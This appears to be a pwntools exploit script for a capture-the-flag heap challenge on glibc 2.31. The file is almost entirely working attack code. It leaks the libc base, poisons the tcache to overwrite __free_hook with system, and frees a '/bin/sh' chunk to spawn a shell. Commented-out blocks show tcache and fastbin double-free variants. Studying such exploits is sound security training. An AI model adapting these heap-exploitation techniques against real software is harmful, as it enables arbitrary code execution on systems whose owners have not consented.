from pwn import *

exe = ELF("./tmp_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def create(size, index):
    p.sendlineafter(b"choice:\n", b"1")
    p.sendline(f"{size}".encode())
    p.sendline(f"{index}".encode())

def view(index):
    p.sendlineafter(b"choice:\n", b"2")
    p.sendline(f"{index}".encode())

def edit(index, data):
    p.sendlineafter(b"choice:\n", b"3")
    p.sendline(f"{index}".encode())
    p.send(data)

def delete(index):
    p.sendlineafter(b"choice:\n", b"4")
    p.sendline(f"{index}".encode())

script = '''
b *delete
b *create
b *edit
'''

p = process("./tmp_patched")
#p = gdb.debug("./tmp_patched", gdbscript = script)

# TCACHE POISONING TO MALLOC HOOK
create(0x500, 0)
create(0x10, 2)
delete(0)
view(0)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1ecbe0
print(hex(libc_base))

create(0x20, 0)
create(0x20, 1)
delete(0)
delete(1)
__free_hook = libc_base + libc.symbols['__free_hook']
edit(1, p64(__free_hook))
create(0x20, 1)
create(0x20, 0)

system = libc_base + libc.symbols['system']
edit(0, p64(system))
edit(1, b"/bin/sh\x00")
delete(1)


# DOUBLE FREE TCACHE
'''
create(0x20, 0)
delete(0)
edit(0, p64(0) + b"A" * 8)
delete(0)
'''

# DOUBLE FREE FASTBIN
'''
for i in range(10):
    create(0x20, i)
for i in range(7):
    delete(i)
delete(7)
delete(8)
delete(7)
'''
p.interactive()